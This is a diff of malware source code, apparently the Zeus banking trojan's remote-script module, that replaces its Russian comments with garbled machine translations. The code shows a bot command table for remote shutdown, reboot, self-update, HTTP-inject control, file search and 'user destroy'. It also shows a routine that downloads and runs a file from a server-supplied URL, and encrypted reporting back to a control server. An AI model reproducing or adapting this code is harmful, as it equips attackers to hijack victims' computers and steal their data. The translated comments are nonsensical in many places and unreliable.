@@ -29,9 +29,9 @@
 #include "..\common\sync.h"
 #include "..\common\comlibrary.h"
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Инструменты.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Tools.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 #if(BO_WININET > 0 || BO_NSPR4 > 0)
 /*
@@ -78,22 +78,22 @@ static bool httpGrabberListOperation(DWORD listId, bool add, const LPWSTR *argum
 
     Mem::free(localConfig);
     LocalConfig::endReadWrite(NULL);
-    return true; //Т.е. уже все есть или нет в спике.
+    return true; //Ie already have everything or not at Speke.
   }
   return false;
 }
 #endif
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Команды.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Team.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 enum
 {
-  PF_SHUTDOWN  = 0x01, //Вылючить компьютер.
-  PF_REBOOT    = 0x02, //Перезагрузить компютер.
-  PF_LOGOFF    = 0x04, //Завершить текущию сессю пользователя.
-  PF_UNINSTALL = 0x08, //Удалить бота.
-  PF_DESTROY   = 0x10  //Уничтожение пользователя.
+  PF_SHUTDOWN  = 0x01, //Vylyuchit computer.
+  PF_REBOOT    = 0x02, //Reload this Computer.
+  PF_LOGOFF    = 0x04, //Complete the current user session.
+  PF_UNINSTALL = 0x08, //Remove bot.
+  PF_DESTROY   = 0x10  //Destruction of the user.
 };
 
 static DWORD pendingFlags;
@@ -237,15 +237,15 @@ static bool userExecute(const LPWSTR *arguments, DWORD argumentsCount)
     {
       if(Str::_utf8FromUnicode(arguments[1], -1, &u8Url))
       {
-        //Создаем временную директорию.
+        //Create a temporary directory.
         if(Fs::_createTempDirectory(NULL, filePath))
         {
-          //Получаем имя файла.
+          //Obtain the file name.
           //FIXME: Content-Disposition
           LPWSTR fileName = HttpTools::_getFileNameFromUrl((LPSTR)u8Url.data);
           if(fileName != NULL && Fs::_pathCombine(filePath, filePath, fileName))
           {
-            //Загрузка файла.
+            //Download file.
             Wininet::CALLURLDATA cud;
             Core::initDefaultCallUrlData(&cud);
 
@@ -269,14 +269,14 @@ static bool userExecute(const LPWSTR *arguments, DWORD argumentsCount)
         Str::_utf8Free(&u8Url);
       }
     }
-    //Локальный путь. Конвертация переменных.
+    //Local path. Converting variables.
     else
     {
       DWORD size = CWA(kernel32, ExpandEnvironmentStringsW)(arguments[1], filePath, MAX_PATH);
       if(size > 0 && size < MAX_PATH)ok = true;
     }
 
-    //Запсук файла.
+    //Zapsuk file.
     if(ok)
     {
       LPWSTR commandLine = NULL;
@@ -287,10 +287,10 @@ static bool userExecute(const LPWSTR *arguments, DWORD argumentsCount)
       else
       {
         WDEBUG1(WDDT_INFO, "commandLine=[%s]", commandLine);
-        //Запуск.
+        //Start.
         ok = (((int)CWA(shell32, ShellExecuteW)(NULL, NULL, filePath, commandLine, NULL, SW_SHOWNORMAL)) > 32);
       
-        //Ну смысл в том... Что стоит попытаться.
+        //Well the point is ... It's worth a try.
         if(!ok)ok = (Process::_createEx(filePath, commandLine, NULL, NULL, NULL) != 0);
         
         Mem::free(commandLine);
@@ -429,7 +429,7 @@ static bool userFlashPlayerRemove(const LPWSTR *arguments, DWORD argumentsCount)
 */
 static void executePendingCommands(void)
 {
-  //Пока бот должен сохранять свою активность.
+  //Until the boat must maintain its activity.
   if(pendingFlags & PF_DESTROY)
   {
     Core::destroyUser();
@@ -441,7 +441,7 @@ static void executePendingCommands(void)
     CoreInstall::_uninstall(false);
   }
   
-  //Операции завершения работы, может выполниться только один из них.
+  //Operation Shutdown, you can run only one of them.
   if(pendingFlags & (PF_REBOOT | PF_SHUTDOWN))
   {
     Process::_enablePrivilege(SE_SHUTDOWN_NAME, true);
@@ -456,24 +456,24 @@ static void executePendingCommands(void)
   }
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Структура команд.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Command structure.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 typedef bool (*COMMANDPROC)(const LPWSTR *arguments, DWORD argumentsCount);
 typedef struct
 {
-  WORD nameId;      //Имя команды.
-  COMMANDPROC proc; //Функция обработки команды.
+  WORD nameId;      //The name of the team.
+  COMMANDPROC proc; //Function of command processing.
 }COMMANDDATA;
 
 static const COMMANDDATA commandData[] =
 {
-  //Работы с OC.
+  //Work with the OC.
   {CryptedStrings::id_remotescript_command_os_shutdown,             osShutdown},
   {CryptedStrings::id_remotescript_command_os_reboot,               osReboot},
   
-  //Работа с ботом.
+  //Working with a bot.
   {CryptedStrings::id_remotescript_command_bot_uninstall,           botUninstall},
   {CryptedStrings::id_remotescript_command_bot_update,              botUpdate},
 #if(BO_BCSERVER_PLATFORMS > 0)
@@ -483,12 +483,12 @@ static const COMMANDDATA commandData[] =
   {CryptedStrings::id_remotescript_command_bot_httpinject_disable,  botHttpInjectDisable},
   {CryptedStrings::id_remotescript_command_bot_httpinject_enable,   botHttpInjectEnable},
 
-  //Работа с фалйами.
+  //Working with faly.
   {CryptedStrings::id_remotescript_command_fs_path_get,             fsPathGet},
   {CryptedStrings::id_remotescript_command_fs_search_add,           fsSearchAdd},
   {CryptedStrings::id_remotescript_command_fs_search_remove,        fsSearchRemove},
   
-  //Работа с пользователем.
+  //Working with the user.
   {CryptedStrings::id_remotescript_command_user_destroy,            userDestroy},
   {CryptedStrings::id_remotescript_command_user_logoff,             userLogoff},
   {CryptedStrings::id_remotescript_command_user_execute,            userExecute},
@@ -515,15 +515,15 @@ static const COMMANDDATA commandData[] =
   {CryptedStrings::id_remotescript_command_user_flashplayer_remove, userFlashPlayerRemove},
 };
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// RemoteScript
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//In RemoteScript
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 typedef struct
 {
-  WORD errorMessageId; //Сообщение об ошибки или 0.
-  DWORD errorLine;     //Строка ошибки или (DWORD)-1.
-  LPBYTE hash;         //Хэш скрипта.
+  WORD errorMessageId; //Error message, or 0.
+  DWORD errorLine;     //Error string or (DWORD) -1.
+  LPBYTE hash;         //Hash of the script.
 }SCRIPTDATA;
 
 void RemoteScript::init(void)
@@ -543,7 +543,7 @@ static int requestProc(DWORD loop, Report::SERVERSESSION *session)
     SCRIPTDATA *scriptData = (SCRIPTDATA *)session->customData;
     DWORD status = scriptData->errorMessageId == 0 ? 0 : 1;
     
-    //Т.к. сообщение пишуться только первой половиной ascii, не смысла возиться с Unicode/UTF8.
+    //Because message write only the first half of ascii, no sense messing with Unicode/UTF8.
     char message[CryptedStrings::len_max + 10/*DWORD*/];
 
     if(scriptData->errorMessageId == 0)CryptedStrings::_getA(CryptedStrings::id_remotescript_error_success, message);
@@ -600,7 +600,7 @@ static WORD getScriptStatusByHash(LPBYTE hash)
         break;
       }
 
-      //Добавляем новый хэш.
+      //Adding a new hash.
       if(errorMessageId == 0)
       {
         bool added = false;
@@ -617,21 +617,21 @@ static WORD getScriptStatusByHash(LPBYTE hash)
         }
       }
     }
-    //Либо повреждение либо команды еще не когда не принимались. Создаем новый список.
+    //Or damage to any command yet when it is not accepted. Create a new list.
     else if(!BinStorage::_addItem(&localConfig, LocalConfig::ITEM_REMOTESCRIPT_HASH, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, hash, MD5HASH_SIZE))
     {
       errorMessageId = CryptedStrings::id_remotescript_error_not_enough_memory;
       WDEBUG0(WDDT_ERROR, "_addItem failed.");
     }
 
-    //Если произошла ошибка, вносить изменения не нужно.
+    //If an error occurs, make changes, do not need.
     if(errorMessageId != 0)
     {
       Mem::free(localConfig);
       localConfig = NULL;
     }
 
-    //Освобождение памяти и сохранение конфигурации.
+    //Release memory and saving the configuration.
     Mem::free(hashList);
     if(!LocalConfig::endReadWrite(localConfig) && localConfig != NULL)errorMessageId = CryptedStrings::id_remotescript_error_failed_to_save;
   }
@@ -640,7 +640,7 @@ static WORD getScriptStatusByHash(LPBYTE hash)
 }
 
 /*
-  Исполнение скрипта.
+  Execution of the script.
 
   IN scriptText - текст скрипта.
   OUT errorLine - строка на котроый произошла ошибка, или (DWORD)-1 если ошиюка произошла не на
@@ -653,7 +653,7 @@ static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
   WORD errorMessageId = 0;
   LPWSTR *lines;
   DWORD linesCount = Str::_splitToStringsW(scriptText, Str::_LengthW(scriptText), &lines, Str::STS_TRIM, 0);
-  //*errorLine = (DWORD)-1;
+  //* ErrorLine = (DWORD) -1;
   
   if(linesCount == (DWORD)-1)
   {
@@ -662,7 +662,7 @@ static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
   }
   else
   {
-    //Перечисляем строки.
+    //Enumerate the rows.
     for(DWORD i = 0; i < linesCount; i++)if(lines[i] != NULL && lines[i][0] != 0)
     {
       LPWSTR *args;
@@ -680,7 +680,7 @@ static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
         {
           WCHAR commandNameBuffer[CryptedStrings::len_max];
           
-          //Ищим команду.
+          //Ischim team.
           DWORD ci = 0;
           for(; ci < sizeof(commandData) / sizeof(COMMANDDATA); ci++)
           {
@@ -698,7 +698,7 @@ static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
             }
           }
 
-          //Если команда не найдена.
+          //If the command was not found.
           if(ci == sizeof(commandData) / sizeof(COMMANDDATA))
           {
             WDEBUG1(WDDT_INFO, "Unknown command \"%s\".", args[0]);
@@ -709,7 +709,7 @@ static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
         Mem::freeArrayOfPointers(args, argsCount);
       }
 
-      //Если найдена ошибка, прерываем выполнение скрипта.
+      //If you found an error aborts the script.
       if(errorMessageId != 0)break;
     }
     Mem::freeArrayOfPointers(lines, linesCount);
@@ -718,13 +718,11 @@ static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
   return errorMessageId;
 }
 
-/*
-  Точка входа для обработки скрипта.
+/*В В The entry point for processing the script.
 
-  IN p   - BinStorage::STORAGE.
+В В IN p - BinStorage:: STORAGE.
 
-  Return - 0.
-*/
+В В Return - 0.*/
 static DWORD WINAPI scriptProc(void *p)
 {
   CoreHook::disableFileHookerForCurrentThread(true);
@@ -742,16 +740,16 @@ static DWORD WINAPI scriptProc(void *p)
   LPBYTE currentHash;
   pendingFlags = 0;
   
-  //Обзор скриптов.
+  //Overview of scripts.
   while((curItem = BinStorage::_getNextItem(script, curItem)))if(curItem->realSize > MD5HASH_SIZE && (currentHash = (LPBYTE)BinStorage::_getItemData(curItem)) != NULL)
   {
     WDEBUG1(WDDT_INFO, "Founded script with size %u", curItem->realSize);
 
-    //Получем данные о хэше скрипта.
+    //Data were obtained on a hash script.
     WORD errorMessageId = getScriptStatusByHash(currentHash);
     DWORD errorLine = (DWORD)-1;
 
-    //Исполнение скрипта.
+    //Execution of the script.
     if(errorMessageId == 0)
     {
       LPWSTR scriptText = Str::_utf8ToUnicode((LPSTR)((LPBYTE)currentHash + MD5HASH_SIZE), curItem->realSize - MD5HASH_SIZE);
@@ -767,7 +765,7 @@ static DWORD WINAPI scriptProc(void *p)
       Mem::free(scriptText);
     }
     
-    //Отправка ответа серверу.
+    //Sending a response from the server.
     {
       BinStorage::STORAGE *config;
       if((config = DynamicConfig::getCurrent()))
@@ -793,7 +791,7 @@ static DWORD WINAPI scriptProc(void *p)
           serverSession.url         = url;
           serverSession.requestProc = requestProc;
           serverSession.resultProc  = resultProc;
-          serverSession.stopEvent   = NULL;//coreData.globalHandles.stopEvent; //Если мы скачали обновление, то есть шасн не успеть отправить ответ.
+          serverSession.stopEvent   = NULL;//coreData.globalHandles.stopEvent; / / If we downloaded the update, then there is no time CHASSENEUIL post a reply.
           serverSession.rc4Key      = &rc4Key;
           serverSession.postData    = NULL;
           serverSession.customData  = &scriptData;
